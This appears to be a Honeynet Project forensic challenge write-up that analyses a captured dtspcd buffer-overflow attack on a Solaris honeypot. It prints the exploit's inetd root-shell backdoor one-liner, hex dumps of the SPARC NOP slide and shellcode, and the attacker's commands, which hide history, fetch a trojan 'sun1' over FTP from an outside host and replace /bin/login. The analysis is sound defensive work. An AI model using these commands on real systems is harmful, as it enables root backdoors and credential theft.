@@ -1,0 +1,405 @@
+<html><head>
+<title>scan20</title></head>
+<body>
+Honeynet Monthly Challenge - Scan 20<br>
+Author: Wolfgang Behounek &lt;Wolfgang.Behounek@iwb.tum.de&gt;
+<h3>The Challenge</h3>
+On 08 January, 2002 a default, unpatched installation of Solaris8 Sparc
+was remotely compromised with the <a href="http://www.cert.org/advisories/CA-2001-31.html">
+dtspcd exploit</a>.  What makes this attack interesting is that this is the first time the 
+attack was identified and captured in the wild, resulting a 
+<a href="http://www.cert.org/advisories/CA-2002-01.html">CERT advisory</a>.  
+Using the Snort binary capture of the attack, answer the following questions.  The honeypot 
+that is attacked is 172.16.1.102.
+<h3>Preparation</h3>
+First we download the Snort binary capture from honeynet.org using wget:
+<pre>$ wget http://project.honeynet.org/scans/scan20/0108@000-snort.log.tar.gz
+$ md5sum 0108@000-snort.log.tar.gz
+612be364f54ca5fcb47cf70e69419175  0108@000-snort.log.tar.gz
+</pre>
+Ok, the md5sum matches with the one given at the web page of the challenge. We can continue.
+<pre>$ tar xzvf 0108@000-snort.log.tar.gz
+</pre>
+We want to analyze only what happened to 172.16.1.102, so we use tcpdump to 
+filter out other traffic:
+<pre>$ /usr/sbin/tcpdump -r 0108@000-snort.log 'host 172.16.1.102' -w 172.16.1.102.log
+</pre>
+Then we use tcpflow to extract the TCP data streams from the output file:
+<pre>$ tcpflow -v -r ../172.16.1.102.log
+</pre>
+<h3>Overview of the timeline of events</h3>
+The output file 172.16.1.102.log is then loaded into ethereal. Times are given in GMT.
+<p>
+<b>14:19:17</b><br>
+Here our machine was scanned for an open dtspcd-port at 50695s from an 
+dialup-account of bellsouth (208.61.69.153 resolves to 
+adsl-61-69-153.atl.bellsouth.net).
+</p><p>
+<b>14:45:53</b><br>
+Another dialup-account (208.61.1.16, adsl-61-1-160.dab.bellsouth.net)
+starts the actual attack. We can guess that this
+is the same person who scanned the solaris machine before. This is not yet a
+buffer overflow attack as described in CA-2002-01.
+</p><p>
+<b>14:46:04</b><br>
+11 seconds later, the attacker tried to connect to port tcp/1524, the port 
+where the attacker's program will install a backdoor later. Since there was no 
+backdoor yet, the connection was refused.
+</p><p>
+<b>14:46:04. - 14:46:18</b><br>
+4 times, the blackhat startet the dtspcd-exploit attack mentioned in <a href="http://www.cert.org/advisories/CA-2002-01.html">CA-2002-01</a>. Note that after the 4th time it took ca. 11 seconds to close the TCP connection.
+</p><p>
+<b>14:46:18</b><br>
+The blackhat connected again to port tcp/1524. This time 
+our friend succeeded. The attacker sent this sequence of commands to the victim:
+</p><pre>uname -a;ls -l /core /var/dt/tmp/DTSPCD.log; PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin; export PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'| grep -v grep|awk '{print $2}'`
+w
+unset HISTFILE
+cd /tmp
+mkdir /usr/lib
+mv /bin/login /usr/lib/libfl.k
+ftp 64.224.118.115
+ftp
+a@
+cd pub
+binary
+get sun1
+bye
+</pre>
+<b>14:47:15</b><br>
+The ftp-server at 64.224.118.115 answered:
+<pre>221-You have transferred 90544 bytes in 1 files.
+221-Total traffic for this session was 91042 bytes in 1 transfers.
+221-Thank you for using the FTP service on widcr0004atl2.interland.net.
+221 Goodbye.
+</pre> The ftp server claimed to have transferred 90544 bytes. tcpflow has
+saved this stream of the ftp data connection as 064.224.118.115.00020-172.016.001.102.33514,
+and its file size is only 89776 Bytes. The difference indicates that the
+ftp download of sun1 was interrupted and didn't complete. <p>
+<b>14:47:15</b><br>
+The attacker's keystrokes then were:
+</p><pre>ls
+chmod 555 sun1
+mv sun1 /bin/login
+</pre>
+<b>14:48:41</b><br>
+The blackhat disconnected from its victim.
+<p>
+<b>14:47:50 - 14:47:53</b><br>
+The attacker opened a telnet connection from 
+the new ip address 66.156.236.56 (adsl-156-236-56.bct.bellsouth.net). But the
+session didn't go beyond the stage of telnet option negotiation.
+</p><p>
+</p><h3>1. What is a NOP slide, and how is this one different from the NOP slide in 
+the rpc.statd exploit in Scan10? </h3> 
+I investigated the 4 output files of tcpflow, which contain the data streams
+of the attacks, with od(1) and diff(1). I found that the only difference
+between these 4 data streams are 3 bytes at \00020 (0x10), \10107 (0x1047)
+and \10110 (0x1048). So for our purposes it is sufficient to look at only
+one of the streams, e.g. the first one:  <pre>$ tcpdump -q -X -r 0108\@000-snort.log  port 3592
+ [ ... ]
+16:46:04.378306 208.61.1.160.3592 &gt; 172.16.1.102.6112: tcp 1448 (DF)
+0x0000	 4500 05dc a1ac 4000 3006 241c d03d 01a0	E.....@.0.$..=..
+0x0010	 ac10 0166 0e08 17e0 fee2 c115 5f66 192f	...f........_f./
+0x0020	 8018 3ebc e1e9 0000 0101 080a 1ba7 dffb	..&gt;.............
+0x0030	 003f 7548 3030 3030 3030 3032 3034 3130	.?uH000000020410
+0x0040	 3365 3030 3031 2020 3420 0000 0031 3000	3e0001..4....10.
+0x0050	 801c 4011 801c 4011 1080 0101 801c 4011	..@...@.......@.
+0x0060	 801c 4011 801c 4011 801c 4011 801c 4011	..@...@...@...@.
+ [ ... ]
+0x04d0	 801c 4011 801c 4011 801c 4011 801c 4011	..@...@...@...@.
+0x04e0	 801c 4011 801c 4011 801c 4011 801c 4011	..@...@...@...@.
+0x04f0	 20bf ffff 20bf ffff 7fff ffff 9003 e034	...............4
+0x0500	 9223 e020 a202 200c a402 2010 c02a 2008	.#...........*..
+0x0510	 c02a 200e d023 ffe0 e223 ffe4 e423 ffe8	.*...#...#...#..
+0x0520	 c023 ffec 8210 200b 91d0 2008 2f62 696e	.#........../bin
+0x0530	 2f6b 7368 2020 2020 2d63 2020 6563 686f	/ksh....-c..echo
+0x0540	 2022 696e 6772 6573 6c6f 636b 2073 7472	."ingreslock.str
+0x0550	 6561 6d20 7463 7020 6e6f 7761 6974 2072	eam.tcp.nowait.r
+0x0560	 6f6f 7420 2f62 696e 2f73 6820 7368 202d	oot./bin/sh.sh.-
+0x0570	 6922 3e2f 746d 702f 783b 2f75 7372 2f73	i"&gt;/tmp/x;/usr/s
+0x0580	 6269 6e2f 696e 6574 6420 2d73 202f 746d	bin/inetd.-s./tm
+0x0590	 702f 783b 736c 6565 7020 3130 3b2f 6269	p/x;sleep.10;/bi
+0x05a0	 6e2f 726d 202d 6620 2f74 6d70 2f78 2041	n/rm.-f./tmp/x.A
+0x05b0	 4141 4141 4141 4141 4141 4141 4141 4141	AAAAAAAAAAAAAAAA
+0x05c0	 4141 4141 4141 4141 4141 4141 4141 4141	AAAAAAAAAAAAAAAA
+0x05d0	 4141 4141 4141 4141 4141 4141          	AAAAAAAAAAAA
+ [ ... ]
+16:46:04.378324 208.61.1.160.3592 &gt; 172.16.1.102.6112: tcp 1448 (DF)
+0x0000	 4500 05dc a1ad 4000 3006 241b d03d 01a0	E.....@.0.$..=..
+0x0010	 ac10 0166 0e08 17e0 fee2 c6bd 5f66 192f	...f........_f./
+0x0020	 8018 3ebc 5128 0000 0101 080a 1ba7 dffb	..&gt;.Q(..........
+0x0030	 003f 7548 4141 4141 4141 4141 4141 4141	.?uHAAAAAAAAAAAA
+0x0040	 4141 4141 4141 4141 4141 4141 4141 4141	AAAAAAAAAAAAAAAA
+ [ ... ]
+0x05c0	 4141 4141 4141 4141 4141 4141 4141 4141	AAAAAAAAAAAAAAAA
+0x05d0	 4141 4141 4141 4141 4141 4141          	AAAAAAAAAAAA
+ [ ... ]
+16:46:04.527641 208.61.1.160.3592 &gt; 172.16.1.102.6112: tcp 1282 (DF)
+0x0000	 4500 0536 a1ae 4000 3006 24c0 d03d 01a0	E..6..@.0.$..=..
+0x0010	 ac10 0166 0e08 17e0 fee2 cc65 5f66 192f	...f.......e_f./
+0x0020	 8018 3ebc 2720 0000 0101 080a 1ba7 e010	..&gt;.'...........
+0x0030	 003f 755e 4141 4141 4141 4141 4141 4141	.?u^AAAAAAAAAAAA
+0x0040	 4141 4141 4141 4141 4141 4141 4141 4141	AAAAAAAAAAAAAAAA
+ [ ... ]
+0x04e0	 4141 4141 4141 4141 4141 4141 4141 4141	AAAAAAAAAAAAAAAA
+0x04f0	 4141 4141 4141 4141 0000 103e 0000 0014	AAAAAAAA...&gt;....
+0x0500	 4242 4242 ffff ffff 0000 0ff4 4343 4343	BBBB........CCCC
+0x0510	 0002 c5ec 4444 4444 ffff ffff 4545 4545	....DDDD....EEEE
+0x0520	 4646 4646 4747 4747 ff23 ca0c 4242 4242	FFFFGGGG.#..BBBB
+0x0530	 4242 4242 4242                         	BBBBBB
+ [ ... ]
+</pre>
+
+We see a repetition of the sequence 0x80, 0x1c, 0x40 and 0x11
+from offset 0x50 up to offset 0x4ef of the first packet shown. I wasn't able to disassemble this
+sequence, but this sequence can be found in several published exploit programs, where this sequence is 
+used as padding before the shellcode and is referenced as "NOP", which means it does effectively nothing.
+<p>
+To explain the purpose of this NOP sequence, we need some background knowledge about 
+how the most common type of buffer overflow attacks works. I found 2 articles on this subject, 
+"Smashing The Stack For Fun And Profit" by Aleph One (<a href="http://www.phrack.org/phrack/49/P49-14">http://www.phrack.org/phrack/49/P49-14</a>) and "Buffer Overflows Demystified" by murat@enderunix.org (<a href="http://www.enderunix.org/documents/eng/bof-eng.txt">http://www.enderunix.org/documents/eng/bof-eng.txt</a>).
+</p><p>
+In brief, the purpose of overflowing the buffer of the victim's process is to
+overwrite the return address (which is pointing to the calling function) with
+a value which points to the shellcode the attacker wants to have executed.
+</p><p>
+The problem is that the attacker doesn't know in advance how the victim
+process manages its memory, and therefore doesn't know what the memory address
+of his shellcode will be, and with which value he has to overwrite
+the return address in memory.
+</p><p>
+One way to increase the probability of 'hitting' the shellcode is to put a lot
+of NOP instructions in front of the shellcode. This increases the 'margin of
+error'; the value which overwrites the return address just has to point to somewhere in this
+space before the shellcode. The execution pointer will then 'slide' to the shellcode when
+being exploited. This is the way the exploit works in our case.
+</p><p> Since the NOP instructions have to be in the machine language of
+the victim's CPU, we have different NOP slides for different CPUs. In our
+case the sequence is a NOP sequence for a SPARC processor. In the rpc.statd
+exploit in scan10, however, the machine which was attacked was an Intel-based
+linux machine. In that case the NOP sequence is a sequence of 0x90, which
+is a NOP instruction for Intel-based CPUs.  </p><h3>2.The attack was on 08 Jan, 2002. Would Snort have generated an alert then 
+for the attack? </h3>
+To answer this question, I downloaded the version 1.8.3 of snort from www.snort.com, which was the current 
+version of January 8th.  This 
+distribution doesn't contain an explicit rule for scanning for the dtspcd 
+exploit. There is a shellcode rule which checks the traffic for the solaris NOP 
+sequence which was used in this attack (see above), but by default these 
+signatures are disabled by default, so they probably weren't active.
+<p>
+Therefore I think that snort didn't generate an alert.
+</p><h3>3.In the exploit code, the command "/bin/sh sh -i" is given, what is its 
+purpose, and why is 'sh' shown twice? </h3>
+The complete line in the exploit code reads:
+<pre>/bin/ksh -c echo "ingreslock stream tcp nowait root /bin/sh sh -i"&gt;/tmp/x;\
+/usr/sbin/inetd -s /tmp/x;sleep 10;/bin/rm -f /tmp/x
+</pre>
+This creates a file named /tmp/x which contains "ingreslock stream tcp nowait 
+root /bin/sh sh -i" and starts a new inetd with /tmp/x as its configuration 
+file. After 10s /tmp/x is removed.
+<p>
+When a client connects to TCP port 1524 (ingreslock), the inetd started by this line
+creates an interactive shell with root privileges. This way the attacker has 
+created a back door, by which he/she is able to access the system as 
+superuser.  
+</p><p>
+Because /tmp/x has to be a valid inetd configuration file, the line being 
+echoed into /tmp/x has to follow the inetd configuration file syntax given in inetd.conf(5). 
+So "/bin/sh" is the program to be invoked by inetd, "sh -i" are the arguments 
+including argv[0], the program itself. Therefore "sh" is shown twice.
+</p><h3>4.The attacker executed a variety of commands on the hacked Solaris box. 
+Which commands were automated by the exploit, which commands were manual by 
+the attacker himself? </h3>
+I  summarize the timeline of the attacker's interactive session  on port tcp/1524 as follows: 
+<p>
+<table border="1">
+<tbody><tr>
+<th>Nr.</th>
+<th>Time in GMT</th>
+<th>Delay/s</th>
+<th>Keystrokes</th>
+</tr>
+<tr>
+<td>1</td>
+<td>14:46:07.191308</td>
+<td>-</td><td>    -- Last packet of last buffer overflow attack. --</td>
+</tr>
+<tr>
+<td>2</td>
+<td>14:46:18.133639</td>
+<td>10.942</td><td>    --  victim sends FIN packet from port tcp/6112. --</td>
+</tr>
+<tr>
+<td>3</td>
+<td>14:46:18.215738</td>
+<td>0.082</td><td>    --  Attacker' machine ack's FIN packet to port tcp/6112. --</td>
+</tr>
+<tr>
+<td>4</td>
+<td>14:46:18.239726</td>
+<td>0.024</td><td>    --  Attacker requests connection to victim, port tcp/1524. --</td>
+</tr>
+<tr>
+<td>5</td>
+<td>14:46:18.240971</td>
+<td>0.001</td><td>    --  Connection Handshake. --</td>
+</tr>
+<tr>
+<td>6</td>
+<td>14:46:18.398402</td>
+<td>0.157</td><td>    --  Connection Handshake finished. --</td>
+</tr>
+<tr>
+<td>7</td>
+<td>14:46:18.398416</td>
+<td>0.00014</td><td>    --  Attacker's machine sends FIN packet to port tcp/6112. --</td>
+</tr>
+<tr>
+<td>8</td>
+<td>14:46:18.398427</td>
+<td>0.00001</td>
+<td>uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;\<br>
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;\<br>
+export PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'| \<br>
+grep -v grep|awk '{print $2}'`&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>9</td>
+<td>14:46:18.399867</td>
+<td>0.001</td><td>    --  victim acks FIN packet. TCP connection to port tcp/6112  is closed. --</td>
+</tr>
+<tr>
+<td>10</td>
+<td>14:46:22.262598</td>
+<td>3.862</td><td> w&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>11</td>
+<td>14:46:49.655454</td>
+<td>27.392</td><td>unset HISTFILE&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>12</td>
+<td>14:46:49.740975</td>
+<td>0.085</td><td> cd /tmp&lt;Ret&gt;mkdir /usr/lib&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>13</td>
+<td>14:46:50.317787</td>
+<td>0.577</td><td> mv /bin/login /usr/lib/libfl.k&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>14</td>
+<td>14:45:59.669894</td>
+<td>9.352</td><td> ftp 64.224.118.115&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>15</td>
+<td>14:47:04.152716</td>
+<td>4.483</td><td> ftp&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>16</td>
+<td>14:47:05.973543</td>
+<td>1.821</td><td> a@&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>17</td>
+<td>14:47:08.590251</td>
+<td>2.617</td><td> cd pub&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>18</td>
+<td>14:47:10.001416</td>
+<td>1.411</td><td> binary&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>19</td>
+<td>14:47:11.970275</td>
+<td>1.969</td><td> get sun1&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>20</td>
+<td>14:47:13.020046</td>
+<td>1.050</td><td> bye&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>21</td>
+<td>14:47:30.599138</td>
+<td>17.579</td><td>&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>22</td>
+<td>14:47:31.546443</td>
+<td>0.947</td><td> ls&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>23</td>
+<td>14:47:37.680413</td>
+<td>5.934</td><td> chmod 555 sun1&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>24</td>
+<td>14:47:38.460464</td>
+<td>0.980</td><td> mv sun1 /bin/login&lt;Ret&gt;</td>
+</tr>
+<tr>
+<td>25</td>
+<td>14:48:41.454625</td>
+<td>62.994</td><td> -- Connection termination from port tcp/1524 ---</td>
+</tr>
+</tbody></table>
+</p><p>
+We see that:
+</p><ul>
+ <li>The connection termination from port tcp/6112 overlaps the connection establishment to port 1524 of the victim.</li>
+  <li>Packet 8 has been sent only 0.000025s after connection establishment.</li>
+</ul> This indicates that the connection establishment to port tcp/1524 and
+the command line typed in packet 8 are part of the exploit script the attacker
+used. <p> The delay times of the subsequent packets indicate that our friend typed
+only casually then. The only exception is at packet 11, 12 and 13. These
+command lines were sent within 0.56s, so I guess these 3 command lines were
+typed using cut and paste.  </p><h3>5.What is sun1, and how does it work? </h3>
+We see that the blackhat moved /bin/login to /usr/lib/libfl.k, then downloaded 
+sun1. After the download, sun1 was given execution rights and was moved to 
+/bin/login.  11 seconds later, our attacker opened a telnet connection from 
+adsl-156-236-56.bct.bellsouth.net (66.156.236.56), but the conversation didn't 
+go beyond the stage of telnet option negotiation. 
+<p>
+The file sun1 is reconstructed by tcpflow as 
+064.224.118.115.00020-172.016.001.102.33514 . The command file(1) on 
+this output tells us that sun1 was a statically linked SPARC executable. But 
+because of the incomplete ftp download, it was broken and wouldn't have worked. 
+Using strings(1) and less(1) on 
+064.224.118.115.00020-172.016.001.102.33514, we also see that sun1 
+contained a reference to /usr/lib/libfl.k.
+</p><p>
+This leads to the assumption that sun1 was intended to execute /usr/lib/libfk.k 
+(and thus the former /bin/login) after the execution of some (trojan?) 
+functions.
+</p><p>
+Since on Solaris systems /bin/login is called by several applications like 
+telnetd, rlogind, sshd etc. for authentication to the system, we can conclude 
+that sun1 was intended to create a backdoor into these services. This is 
+verified by the observation that 11 seconds later the blackhat tried to log in 
+via telnet and couldn't succeed, because telnetd couldn't start /bin/login 
+for authentication.
+</p><h3>6.What did you learn from this exercise? </h3>
+<ul>
+<li>A lot about how buffer overflow attacks work. </li>
+<li>Which one of the tools ethereal, tcpdump or tcpflow is the most appropriate for a given task.</li>
+<li>Don't rely solely on one intrusion detection system.</li>
+<li>And of course, I could practice my English (Well, you already may have noticed this :-)) )</li>
+</ul>
+<h3>7.How long did this challenge take you? </h3>
+This is the most difficult question to answer. I think the total time I spent is about 10 hours 
+distributed over the last 3 weeks. 
+<h3>Bonus Question:
+One of the commands executed during the attack is 
+echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'` 
+What is the purpose of this command and what does 'BD' stand for? </h3>
+Here the attacker checks if his/her backdoor ("BD") is still running. This 
+line of code prints the process ids of the inetd-processes, which are started 
+by the exploit code.
+</body></html>
